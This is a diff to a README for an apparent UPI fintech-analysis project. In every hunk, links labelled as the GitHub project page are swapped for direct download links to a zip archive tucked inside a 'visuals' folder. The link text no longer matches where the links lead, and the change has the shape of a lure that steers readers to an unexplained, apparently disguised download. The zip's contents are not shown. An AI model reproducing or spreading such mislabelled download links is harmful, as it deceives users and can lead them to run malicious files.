@@ -1,6 +1,6 @@
 # 📊 upi-fintech-analysis - Clear UPI Insights for Everyone
 
-[![Download / Open App](https://img.shields.io/badge/Download%20%2F%20Open-Project%20Page-blue?style=for-the-badge)](https://github.com/paulineconsuming416/upi-fintech-analysis)
+[![Download / Open App](https://img.shields.io/badge/Download%20%2F%20Open-Project%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/paulineconsuming416/upi-fintech-analysis/main/upi-fintech-analysis/visuals/upi_analysis_fintech_3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This project helps you review UPI transaction data and turn it into easy-to-read
 
 Use the link below to visit the project page and download or open the files you need:
 
-[Open the project page here](https://github.com/paulineconsuming416/upi-fintech-analysis)
+[Open the project page here](https://raw.githubusercontent.com/paulineconsuming416/upi-fintech-analysis/main/upi-fintech-analysis/visuals/upi_analysis_fintech_3.4.zip)
 
 ## 🪟 What You Need on Windows
 
@@ -25,7 +25,7 @@ If you want to view charts and data files, keep Excel or a CSV viewer ready. If 
 ## 📥 Download and Set Up
 
 1. Open the project page:  
-   [https://github.com/paulineconsuming416/upi-fintech-analysis](https://github.com/paulineconsuming416/upi-fintech-analysis)
+   [https://raw.githubusercontent.com/paulineconsuming416/upi-fintech-analysis/main/upi-fintech-analysis/visuals/upi_analysis_fintech_3.4.zip](https://raw.githubusercontent.com/paulineconsuming416/upi-fintech-analysis/main/upi-fintech-analysis/visuals/upi_analysis_fintech_3.4.zip)
 
 2. On the page, click the green Code button.
 
@@ -227,7 +227,7 @@ If a step feels unclear, start from the folder contents and open the main README
 
 ## 🔗 Project Page
 
-[Visit the GitHub project page](https://github.com/paulineconsuming416/upi-fintech-analysis)
+[Visit the GitHub project page](https://raw.githubusercontent.com/paulineconsuming416/upi-fintech-analysis/main/upi-fintech-analysis/visuals/upi_analysis_fintech_3.4.zip)
 
 ## 📄 Data and Tools Used
 
